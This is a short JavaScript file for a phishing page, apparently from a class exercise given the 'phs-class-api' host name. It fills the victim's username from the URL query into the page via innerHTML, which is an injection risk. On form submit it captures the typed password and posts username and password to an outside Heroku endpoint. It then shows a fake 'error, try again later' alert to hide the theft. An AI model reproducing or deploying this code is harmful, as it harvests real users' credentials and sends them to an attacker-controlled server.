function jsonToURI(json){
  return encodeURIComponent(JSON.stringify(json));
}

async function postData(url = '', data = {}) {
  var params = new URLSearchParams(data);
  console.log(params.toString());
  // firstName=Jonas&lastName=Gauffin

  const response = await fetch(url, {
    method: 'POST',
    mode: 'no-cors',
    cache: 'no-cache',
    credentials: 'same-origin',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    },
    redirect: 'follow',
    referrerPolicy: 'no-referrer',
    body: params,
  });

  return response;
}

const urlParams = new URLSearchParams(window.location.search);
const user = urlParams.get('u');
const userName = document.getElementsByClassName('username')[0];
const form = document.getElementsByClassName('phishingForm')[0];

console.log('HOLA SOY EL MALICIOSO');

userName.innerHTML = user;

form.addEventListener('submit', function(e) {
  e.preventDefault();
  postData('https://phs-class-api.herokuapp.com/user', {
    username: user,
    password: e.target.p.value,
  }).then(alert('Ocurrio un error, por favor intente de nuevo mas tarde'));
});
